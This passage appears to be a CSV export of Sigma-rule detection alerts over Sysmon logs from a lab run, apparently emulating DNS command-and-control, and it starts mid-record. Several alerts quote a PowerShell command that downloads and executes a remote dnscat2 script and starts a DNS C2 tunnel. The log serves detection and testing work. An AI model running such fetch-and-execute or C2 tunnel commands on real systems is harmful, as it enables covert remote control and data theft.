TXT -C2Interval 30 -C2Jitter 20 -RunTime 30} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:27:47.601","proc_creation_win_susp_progname.yml","6eb89d91-0b61-8b22-9a6f-86894f6de6ec","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:17.472 +01:00","Windows Shell/Scripting Processes Spawning Suspicious Programs","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec ¦ Evas","T1059.005 ¦ T1059.001 ¦ T1218","sysmon",175462,"Cmdline: ""C:\WINDOWS\system32\nslookup.exe"" ¦ Proc: C:\Windows\System32\nslookup.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6592 ¦ PGUID: E9F06A57-63B9-694E-6602-000000002400 ¦ ParentPID: 9956 ¦ ParentPGUID: E9F06A57-63B1-694E-5F02-000000002400 ¦ Description: nslookup ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=10FAC41C9075D456ABFBA9CD17C9A177,SHA256=123EF423B3B4623C02D60C683F5C0BCFEF232400A625FC172B7FAB04A97EB677,IMPHASH=EC3E3C718C086FAB4F7F35008A5E9116","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: nslookup.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:17.464","proc_creation_win_susp_shell_spawn_susp_program.yml","fb5e7a7a-c746-43b5-fa05-f34d01330afc","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:14.616 +01:00","Network Connection Initiated By PowerShell Process","low","DESKTOP-G2OBL3D","Sysmon",3,"Exec","T1059.001","detection.threat-hunting ¦ sysmon",175449,"Initiated: true ¦ Proto: tcp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 57051 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 185.199.111.133 ¦ TgtPort: 443 ¦ TgtHost: cdn-185-199-111-133.github.com ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9956 ¦ PGUID: E9F06A57-63B1-694E-5F02-000000002400","DestinationIsIpv6: false ¦ DestinationPortName: https ¦ RuleName: - ¦ SourceIsIpv6: false ¦ SourcePortName: - ¦ UtcTime: 2025-12-26 10:30:13.035","net_connection_win_powershell_network_connection.yml","30030033-0a85-0cb9-bbc0-999b656bddcc","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:15.658 +01:00","Dynamic .NET Compilation Via Csc.EXE - Hunting","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1027.004","detection.threat-hunting ¦ sysmon",175453,"Cmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\3stwtxwi\3stwtxwi.cmdline"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8044 ¦ PGUID: E9F06A57-63B7-694E-6102-000000002400 ¦ ParentPID: 9956 ¦ ParentPGUID: E9F06A57-63B1-694E-5F02-000000002400 ¦ Description: Visual C# Command Line Compiler ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 4.8.9232.0 built by: NET481REL1LAST_C ¦ IntegrityLevel: High ¦ OriginalFileName: csc.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:15.591","proc_creation_win_csc_compilation.yml","f9e69aab-6557-350e-1581-b1648bc0fff3","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:16.471 +01:00","Dynamic .NET Compilation Via Csc.EXE - Hunting","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1027.004","detection.threat-hunting ¦ sysmon",175458,"Cmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\v5tccl0z\v5tccl0z.cmdline"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9588 ¦ PGUID: E9F06A57-63B8-694E-6302-000000002400 ¦ ParentPID: 9956 ¦ ParentPGUID: E9F06A57-63B1-694E-5F02-000000002400 ¦ Description: Visual C# Command Line Compiler ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 4.8.9232.0 built by: NET481REL1LAST_C ¦ IntegrityLevel: High ¦ OriginalFileName: csc.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:30:16.424","proc_creation_win_csc_compilation.yml","f9e69aab-6557-350e-1581-b1648bc0fff3","C:\Tools\Logs\art_1071_004x.evtx"
